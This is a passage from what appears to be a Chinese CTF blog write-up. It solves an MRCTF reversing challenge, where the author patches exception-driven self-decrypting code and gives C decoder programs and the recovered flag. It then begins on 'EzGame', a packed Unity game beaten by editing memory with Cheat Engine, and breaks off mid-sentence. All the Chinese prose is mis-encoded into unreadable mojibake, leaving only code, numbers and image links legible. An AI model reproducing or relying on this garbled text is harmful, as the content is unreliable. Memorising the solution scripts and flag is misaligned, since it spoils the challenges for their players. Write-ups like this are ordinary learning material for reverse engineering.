1çš„æ´»åŠ¨ï¼šæ¥å—å¤„ç†æ¥è‡ªå­è¿›ç¨‹çš„å¼‚å¸¸ï¼Œè¿›è€Œä¿®æ”¹å­è¿›ç¨‹ä»£ç ã€‚</p><p><img src="https://i.loli.net/2021/04/12/szbXIDkcymFJGUo.png" alt="image-20210412112837615"></p><p>æ‰€ä»¥ç°åœ¨å…³é”®å°±æ˜¯è¦å»å¯»æ‰¾å­è¿›ç¨‹è¦æ‰§è¡Œå‡½æ•°ä¸­å‡ºç°è§¦å‘å¼‚å¸¸åœ°æ–¹ï¼Œè¿›è€Œå¯¹ç€çˆ¶è¿›ç¨‹å¤„ç†æ¨¡å—åˆ†æã€‚è¿™é‡Œæˆ‘ç›´æ¥è°ƒè¯•äº†ä¸‹çˆ¶è¿›ç¨‹ï¼Œè®°å½•å®ƒå¤„ç†å­è¿›ç¨‹å¼‚å¸¸çš„ä½ç½®å’Œå¤„ç†æ–¹å¼ï¼Œéšåè‡ªå·±ç”¨idapythonå»patchä¸€ä¸‹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ç¬¬ä¸€æ¬¡äº¤äº’ï¼šé€šè¿‡é™¤<span class="number">0</span>å¼‚å¸¸è§¦å‘</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">374</span>; i &gt;= <span class="number">0</span>; --i )</span><br><span class="line">    Buffer[i] ^= Buffer[i + <span class="number">1</span>] ^ i;             <span class="comment">// å¯¹è¡¨è¿›è¡Œäº†ä¸€ä¸ªç®€å•å¼‚æˆ–è¿ç®—ã€‚</span></span><br><span class="line">  Buffer[<span class="number">375</span>] = <span class="number">120</span>;</span><br><span class="line">rip += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">ç¬¬äºŒæ¬¡äº¤äº’ï¼šé€šè¿‡int3äº¤äº’ï¼Œè§£å¯†ä»£ç ã€‚</span><br><span class="line">åœ°å€ï¼š<span class="number">0x0000401E1C</span></span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x57D</span>; ++i )</span><br><span class="line">    *((_BYTE *)v5 + i) ^= i;</span><br><span class="line">  </span><br><span class="line">rip += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">ç¬¬ä¸‰æ¬¡ï¼Œåœ¨patchåçš„ä»£ç ç¬¬ä¸€æ¬¡é‡åˆ°int3,è§¦å‘å¼‚å¸¸äº¤äº’ï¼š</span><br><span class="line">rip += <span class="number">2</span></span><br></pre></td></tr></table></figure><p>patchæ–‡ä»¶ï¼Œå¹¶nopæ— ç”¨çš„ä»£ç ï¼š</p><p><img src="https://i.loli.net/2021/04/14/2xEwBcXAsW4thbu.png" alt="mwGU5aZ38l4PAWc"></p><p>éšååˆ†æç¨‹åºçš„å…³é”®æµç¨‹ï¼Œä¹Ÿå°±æ˜¯å­è¿›ç¨‹æ‰§è¡Œçš„ï¼Œå…ˆåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œå°†è¾“å…¥è¿›è¡ŒåŠ å¯†åçš„æ•°æ®å†™å…¥è¯¥æ–‡ä»¶ä¸­ï¼Œæœ€åå–å‡ºæ–‡ä»¶ä¸­çš„æ•°æ®ä¸æŒ‡å®šç¼–ç æ•°æ®å¯¹æ¯”ã€‚</p><p>è€Œå…³é”®åŠ å¯†å‡½æ•°å°±æ˜¯ä¹‹å‰patchåçš„ï¼šå°±æ˜¯ç”¨æˆ‘ä»¬çš„è¾“å…¥å¯è§å­—ç¬¦ï¼Œå› ä¸ºæœ€é«˜ä¸º0ï¼Œæ‰€ä»¥åªç”¨äº†7ä½ï¼Œåˆ†æˆ3 3 1ä¸‰éƒ¨åˆ†ä½œä¸ºindexï¼Œç½®æ¢è¡¨çš„è¿‡ç¨‹ã€‚è¿™é‡Œçš„emailå…¶å®å¹¶æ²¡æœ‰ä½œä¸ºæ¯”è¾ƒï¼Œçœ‹åˆ°æœ€åç”¨äº†æœ‰ä¸€ä¸ªå¼‚æˆ–æ“ä½œï¼Œè€Œåœ¨æœ€åçš„æ¯”å¯¹è¿‡ç¨‹ä¸­ä¹Ÿæœ‰ä¸€ä¸ªåŒæ ·çš„æ“ä½œï¼Œå°±è¿˜åŸäº†ï¼Œæ‰€ä»¥å¯†æ–‡å°±æ˜¯ä¸ç»è¿‡å¼‚æˆ–åŠ å¯†åçš„ç»“æœã€‚<br><img src="https://i.loli.net/2021/04/12/wfFu2ZJQS6IL4N1.png" alt="image-20210412114342071"></p><p>æœ€åå…ˆçˆ†ç ´ï¼Œå†è¿›è¡Œä¸€ä¸ªbytes.fromhex()ï¼Œæœ€åä¸€ä¸ªå‡æ³•ã€‚æ¯”èµ›æ—¶èµ¶æ—¶é—´å†™çš„ï¼Œæ¯”è¾ƒæ°´ï¼Œç”¨pythonå¤„ç†èµ·æ¥æ–¹ä¾¿ä¸€äº›ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> enc[] = &#123;<span class="number">71</span>, <span class="number">90</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">105</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">53</span>, <span class="number">122</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">53</span>, <span class="number">119</span>, <span class="number">71</span>, <span class="number">86</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">53</span>, <span class="number">119</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">107</span>, <span class="number">53</span>, <span class="number">118</span>, <span class="number">71</span>, <span class="number">106</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">53</span>, <span class="number">120</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">53</span>, <span class="number">118</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">71</span>, <span class="number">106</span>, <span class="number">53</span>, <span class="number">118</span>, <span class="number">71</span>, <span class="number">107</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">105</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">71</span>, <span class="number">106</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">53</span>, <span class="number">84</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">71</span>, <span class="number">86</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">53</span>, <span class="number">122</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">71</span>, <span class="number">107</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">71</span>, <span class="number">107</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">71</span>, <span class="number">106</span>, <span class="number">71</span>, <span class="number">86</span>, <span class="number">72</span>, <span class="number">109</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">72</span>, <span class="number">109</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">71</span>, <span class="number">106</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">106</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">53</span>, <span class="number">118</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">53</span>, <span class="number">118</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">53</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">105</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">71</span>, <span class="number">86</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">53</span>, <span class="number">122</span>, <span class="number">71</span>, <span class="number">105</span>, <span class="number">53</span>, <span class="number">120</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">53</span>, <span class="number">118</span>, <span class="number">71</span>, <span class="number">106</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">71</span>, <span class="number">105</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">53</span>, <span class="number">118</span>, <span class="number">53</span>, <span class="number">119</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">71</span>, <span class="number">105</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">53</span>, <span class="number">119</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">106</span>, <span class="number">53</span>, <span class="number">84</span>, <span class="number">53</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">105</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">53</span>, <span class="number">119</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">72</span>, <span class="number">109</span>, <span class="number">71</span>, <span class="number">105</span>, <span class="number">71</span>, <span class="number">105</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">72</span>, <span class="number">109</span>, <span class="number">53</span>, <span class="number">122</span>, <span class="number">53</span>, <span class="number">119</span>, <span class="number">72</span>, <span class="number">109</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">72</span>, <span class="number">109</span>, <span class="number">71</span>, <span class="number">107</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">71</span>, <span class="number">106</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">53</span>, <span class="number">84</span>, <span class="number">53</span>, <span class="number">122</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">71</span>, <span class="number">107</span>, <span class="number">72</span>, <span class="number">109</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">71</span>, <span class="number">107</span>, <span class="number">72</span>, <span class="number">109</span>, <span class="number">71</span>, <span class="number">86</span>, <span class="number">71</span>, <span class="number">106</span>, <span class="number">53</span>, <span class="number">119</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">107</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">71</span>, <span class="number">105</span>, <span class="number">53</span>, <span class="number">118</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">53</span>, <span class="number">120</span>, <span class="number">53</span>, <span class="number">118</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">53</span>, <span class="number">120</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">53</span>, <span class="number">122</span>, <span class="number">71</span>, <span class="number">87</span>, <span class="number">72</span>, <span class="number">108</span>, <span class="number">53</span>, <span class="number">119</span>, <span class="number">69</span>, <span class="number">120</span>&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> table[<span class="number">9</span>][<span class="number">9</span>] = &#123;<span class="string">"ABCDEFGH"</span>, <span class="string">"12345678"</span>, <span class="string">"0IJKLMNO"</span>, <span class="string">"+OPQRStu"</span>, </span><br><span class="line"><span class="string">"\\vwxyzTU"</span>, <span class="string">"abcdefgh"</span>, <span class="string">"VWXYZijk"</span>, <span class="string">"lmnopqrs"</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j, v25, v24, v23, ans1, ans2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">12</span>; i &lt; <span class="keyword">sizeof</span>(enc)<span class="number">-1</span>; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">32</span>; j &lt; <span class="number">127</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> ch = j;</span><br><span class="line">v25 = (ch &gt;&gt; <span class="number">6</span>) &amp; <span class="number">1</span>;</span><br><span class="line">    v24 = (ch &gt;&gt; <span class="number">3</span>) &amp; <span class="number">7</span>;</span><br><span class="line">    v23 =  ch &amp; <span class="number">7</span>;</span><br><span class="line">    ans1 = table[v25][v24];</span><br><span class="line">    ans2 = table[v24][v23];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(ans1 == enc[i] &amp;&amp; ans2 == enc[i+<span class="number">1</span>])</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">putchar</span>(j);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//printf("%d %d", ans1, ans2);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> enc[<span class="number">100</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x4d</span>, <span class="number">0x52</span>, <span class="number">0xe2</span>, <span class="number">0x188</span>, <span class="number">0x2b0</span>, <span class="number">0x4b3</span>, <span class="number">0x7a6</span>, <span class="number">0xc8d</span>, <span class="number">0x14a1</span>, <span class="number">0x218d</span>, <span class="number">0x36a7</span>, <span class="number">0x5864</span>, <span class="number">0x8f80</span>, <span class="number">0xe843</span>, <span class="number">0x17827</span>, <span class="number">0x2609d</span>, <span class="number">0x3d926</span>, <span class="number">0x63a38</span>, <span class="number">0xa13c5</span>, <span class="number">0x104e5c</span>, <span class="number">0x1a6252</span>, <span class="number">0x2ab122</span>, <span class="number">0x4513b3</span>, <span class="number">0x6fc534</span>, <span class="number">0xb4d955</span>, <span class="number">0x1249eb9</span>, <span class="number">0x1d9786d</span>, <span class="number">0x2fe179d</span>, <span class="number">0x4d7906b</span>, <span class="number">0x7d5a841</span>, <span class="number">0xcad38cd</span>, <span class="number">0x1482e18b</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> init = enc[<span class="number">0</span>]+enc[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">flag[<span class="number">0</span>] = enc[<span class="number">0</span>], flag[<span class="number">1</span>] = enc[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">2</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = enc[i]-enc[i<span class="number">-1</span>]-enc[i<span class="number">-2</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line"><span class="built_in">putchar</span>(flag[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//MRCTF&#123;C4n_y0u_d3bug_1t?_n0_wa9!&#125;</span></span><br></pre></td></tr></table></figure><h3 id="EzGame"><a href="#EzGame" class="headerlink" title="EzGame"></a>EzGame</h3><p>æ¸¸æˆçœŸå¥½ç©ã€‚</p><p>ä¹‹å‰å˜¶å¼CTFåšè¿‡ä¸€ä¸ªé­”å¡”çš„æ¸¸æˆï¼Œä¹Ÿæ˜¯æœ‰å‡ ä¸ªé€šå…³æ¡ä»¶ä½†æ›´è‹›åˆ»ï¼Œä½†æ˜¯é‚£ä¸ªå¹¶ä¸æ˜¯unity3då†™çš„ï¼Œç›´æ¥é€†å‘ç¨‹åºçœ‹æ¸¸æˆçš„é€»è¾‘æ‰¾æ¯ä¸ªå…³é”®ç‚¹è¿˜æ˜¯èƒ½åˆ†æã€‚è¿™ä¸ªæ¸¸æˆæœ¬èº«ç”¨unity3då†™éš¾åº¦å°±å¤§äº†å¾ˆå¤šï¼Œè¿˜å¯¹ä¸€ä¸ªdllè¿›è¡ŒThemida / Winlicense v3.0.0.0 - 3.0.4.0åŠ å£³ã€‚</p><p>æäº†äº›æ—¶é—´ï¼Œæ²¡æœ‰æŠŠç¨‹åºæ­£å¸¸è°ƒè¯•èµ·æ¥ï¼Œå¼€å§‹æ‰“ç”¨CEçš„ä¸»æ„ã€‚ã€‚</p><p>å¸¸è§„çš„é€šè¿‡æ˜Ÿæ˜Ÿæ•°çš„å¢åŠ ï¼Œä¸æ–­å†æ¬¡æ‰«æç¼©å°èŒƒå›´æ‰¾åˆ°å­˜æ”¾å…¶å€¼çš„å†…å­˜æ‰€åœ¨çš„ä½ç½®ã€‚</p><p><img src="https://i.loli.net/2021/04/12/O6b8jr5AfghM9q3.png" alt="image-20210412125603706"></p><p>å› ä¸ºæœ€åè·å¾—flagçš„è¿˜æœ‰ä¸€ä¸ªæ¡ä»¶å°±æ˜¯æ­»äº¡æ¬¡æ•°ä¸èƒ½å¤ªå¤šï¼Œé‚£å°±è¿˜æœ‰ä¸€ä¸ªè®°å½•æ­»äº¡æ¬¡æ•°çš„å˜é‡ï¼ŒåŒæ ·çš„æ–¹æ³•æ‰¾åˆ°å†…å­˜ä½ç½®ã€‚ä½†å…¶å®ƒä¸‰ä¸ªæ¡ä»¶æ˜¯å¦è¾¾æˆæ ‡å¿—çš„å†…å­˜ä½ç½®å‘¢ã€‚</p><p>è¿™æ—¶å€™æˆ‘è§‚å¯Ÿæˆ‘è®°å½•ä¸‹çš„æ˜Ÿæ˜Ÿæ•°å’Œæ­»äº¡æ¬¡æ•°çš„å†…å­˜åœ°å€ï¼šå¯ä»¥å‘ç°è¿™2ä¸ªå†…å­˜åœ°å€éš”çš„å¾ˆè¿‘ï¼Œè¿™å°±è®©æˆ‘æƒ³åˆ°å…¶ä½™åˆ¤æ–­æ¡ä»¶çš„å†…å­˜åœ°å€ä¹Ÿæ˜¯åœ¨è¿™å—åŒºåŸŸï¼Œå°±åœ¨é™„è¿‘ã€‚</p><p><img src="https://i.loli.net/2021/04/12/FjxvnrsNSMdKLcD.png" alt="image-20210412130845062"></p><p>å¼€å§‹è¯•æ¢å¯»æ‰¾å¦å¤–ä¸‰ä¸ªæ¡ä»¶çš„å†…å­˜ä½ç½®ã€‚</p><p>å› ä¸ºEat Cookieæ˜¯å¯å®ç°çš„ï¼Œæ‰€ä»¥æµè§ˆç›¸å…³å†…å­˜åŒºåŸŸåæˆ‘å»Eat Cookieï¼Œç„¶åçœ‹å†…å­˜å˜åŒ–ã€‚</p><p>å‘ç°ä¸‹å›¾ä¸­çš„å†…å­˜ä½ç½®å˜äº†ï¼Œç„¶åæˆ‘ä»¥ä¸ºè¿™ä¸ªæ ‡å¿—æ˜¯å››å­—èŠ‚æ•°æ®ï¼Œå…¶åé¢è·Ÿç€çš„æ˜¯6æ˜¯æ­»äº¡æ¬¡æ•°ï¼Œé‚£å†åé¢çš„æˆ–è®¸å°±æ˜¯å…¶ä½™2ä¸ªæ¡ä»¶çš„æ ‡å¿—å†…å­˜åŒºåŸŸå§ã€‚</p><p><img src="https://i.loli.net/2021/04/12/f7tDeKoRiP6YsQd.png" alt="image-20210412131401847"></p><p>å¼€å§‹æŠŠåé¢æ‰€æœ‰çš„æ•°æ®ä½œä¸º4å­—èŠ‚æ•°æ®ï¼Œç„¶åéƒ½æ”¹ä¸º1ï¼Œå›åˆ°æ¸¸æˆï¼Œå‘ç°å…¶ä½™2ä¸ªæ¡ä»¶å¹¶æ²¡æœ‰å˜ä¸ºTrueã€‚ã€‚ã€‚</p><p>ä½†è¿˜æœ‰ä¸€ä¸ªæ¡ä»¶GoHomeä¹Ÿæ˜¯å¯ä»¥æ‰“æ¸¸æˆåˆ°è¾¾çš„ï¼Œåˆ°è¾¾åå†æ¬¡è§‚å¯Ÿå†…å­˜å˜åŒ–ï¼Œå‘ç°äº†ç«¯å€ªï¼Œå…¶å®3ä¸ªæ¡ä»¶çš„æ ‡å¿—å˜é‡æ˜¯ä¸€ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œä¹Ÿå°±æ˜¯å­˜Eat Cookieæ ‡å¿—å†…å­˜åœ°å€è·Ÿç€çš„2ä¸ªå­—èŠ‚ã€‚</p><p>ç°åœ¨æŠŠæ‰€æœ‰æ¡ä»¶é€šè¿‡ä¿®æ”¹å†…å­˜è¾¾æˆï¼ŒGetFlagï¼š</p><p><img src="https://i.loli.net/2021/04/12/CrNxG7igVQHTWja.png" alt="image-20210412132340392"></p><p>å…¶å®çŒœä¹Ÿæ˜¯ï¼Œä¸ä¼šè¿™æ ·å°±æŠŠflagå¾—åˆ°äº†ï¼Œï¼Œä¹‹å‰å˜¶å¼çš„é­”å¡”æ¸¸æˆå°±æœ‰å¾ˆå¤šåˆ¤æ–­ï¼Œæ­¥æ•°å•Šï¼Œè¡€é‡ï¼Œèµ°çš„è·¯å¾„ç­‰å„ç§å‚æ•°å»è®¡ç®—å‡ºflagã€‚è¿™ä¸ªé¢˜åº”è¯¥ä¹Ÿæ˜¯è¿™æ ·çš„ã€‚ã€‚</p><p>åœ¨å¢åŠ æ˜Ÿæ˜Ÿæ•°æ—¶æˆ‘ä¹‹å‰è§‚å¯Ÿåˆ°äº†åé¢æœ‰8ä¸ªå­—èŠ‚çš„æ•°æ®åœ¨ä¸æ–­å‘ç”Ÿå˜åŒ–ï¼Œè€Œè¦å¾—åˆ°flagå°±è¦æ˜Ÿæ˜Ÿæ•°æ­£ç¡®ï¼Œè€Œæ˜Ÿæ˜Ÿæ•°åˆå½±å“é‚£8å­—èŠ‚æ•°æ®ï¼Œè‡ªç„¶æƒ³åˆ°é‚£8å­—èŠ‚æ•°æ®å½±å“ç€æœ€åflagã€‚ã€‚</p><p>è¿™æ—¶å€™æˆ‘æœ‰2ä¸ªæƒ³æ³•ï¼š</p><ul><li><p>ä¸€æ˜¯æ‰¾æ–¹æ³•è®¡ç®—å‡ºæ˜Ÿæ˜Ÿæ•°ä¸º105æ—¶çš„8å­—èŠ‚æ•°æ®ï¼›</p></li><li><p>äºŒæ˜¯æ‰¾åˆ°è®°å½•æ‰€èƒ½è·³é«˜åº¦çš„å†…å­˜ä½ç½®æˆ–è®°å½•å½“å‰ä½ç½®çš„å‚æ•°ï¼Œä¿®æ”¹åè¾¾åˆ°å¤–æŒ‚ä¸€æ ·ï¼Œå°†æ˜Ÿæ˜Ÿæ•°ä¸€ä¸ªä¸€ä¸ªåƒæ‰ã€‚</p></li></ul><p>ç¬¬äºŒä¸ªæƒ³æ³•å°è¯•äº†ä¸€ä¸‹ï¼Œä¸æ–­å˜åŒ–ä½ç½®ï¼Œå¹¶æ²¡æœ‰åœ¨é™„è¿‘çš„å†…å­˜ä¸­å‘ç°å˜åŒ–ï¼Œå€’æ˜¯å‘ç°äº†è®°å½•å½“å‰å·²ç»è·³åŠ¨æ­¥æ•°çš„å†…å­˜ä½ç½®ï¼Œç„¶åå°±æ²¡æœ‰åç»­äº†ï¼ˆã€‚ã€‚</p><p>ç„¶åå°è¯•æ‰¾å‡ºè®¡ç®—8å­—èŠ‚æ•°æ®çš„æ–¹æ³•ï¼Œï¼Œå…ˆdumpå‡ºå‡ ç»„æ•°æ®è§‚å¯Ÿäº†ä¸€ä¸‹ï¼šå‘ç°å¥‡æ•°ç»„å’Œå¶æ•°ç»„å¯¹åº”2ä¸ªä¸åŒlfsrç»“æ„ï¼Œå…³é”®åœ¨äºæœ€åä¸€ä¸ªå­—èŠ‚ç§»ä½ï¼ˆä¹Ÿæ˜¯ä¸€ä¸ªlfsrç»“æ„ï¼‰åå¡«å…¥æ–°ä¸€ç»„çš„ç¬¬ä¸€ä¸ªä½ç½®ã€‚ä½†æ˜¯ä¸çŸ¥é“æ¯æ¬¡å¾ªç¯å¡«å……åˆ°æœ€é«˜çš„ä½0æˆ–1æ˜¯æ€ä¹ˆè®¡ç®—çš„å†³å®šçš„ã€‚ã€‚<br><img src="https://i.loli.net/2021/04/12/DqVs6Xo5rTMIWlA.png" alt="image-20210412135221959"></p><p>å…¶å®è¿™é‡Œéƒ½çŸ¥é“å†…å­˜çš„åœ°å€äº†ï¼Œè¦æ˜¯æŠŠç¨‹åºè°ƒè¯•èµ·æ¥ï¼Œé€šè¿‡ceçš„æ˜¯ä»€ä¹ˆè®¿é—®è¿™ä¸ªåœ°å€ï¼Œå¾—åˆ°æ“ä½œç›®æ ‡æ•°æ®çš„æŒ‡ä»¤åœ°å€ååœ¨è°ƒè¯•å™¨ä¸­å»å¯¹åº”æ‰¾åˆ°å…³é”®ä»£ç å°±å¾ˆç®€å•äº†ï¼Œç„¶è€Œè¿™ä¸ªæ¸¸æˆæˆ‘æ²¡èƒ½è°ƒè¯•èµ·æ¥ã€‚</p><p>ä½†è¿˜æœ‰ä¸€ä¸ªåŠæ³•ï¼šdumpå‡ºå½“æ—¶çš„å†…å­˜ï¼Œæ‹–è¿›idaä¸­åˆ†æï¼Œä¸€æ ·å’Œè°ƒè¯•ä¸€æ ·ã€‚ã€‚</p><p>æœ‰äº†è¿™ä¸ªæ€è·¯ï¼Œå…ˆæ˜¯ç›´æ¥å®šä½åˆ°æœ€åGetFlagæ—¶è¦è¿›è¡Œæ¯”è¾ƒçš„ä»£ç 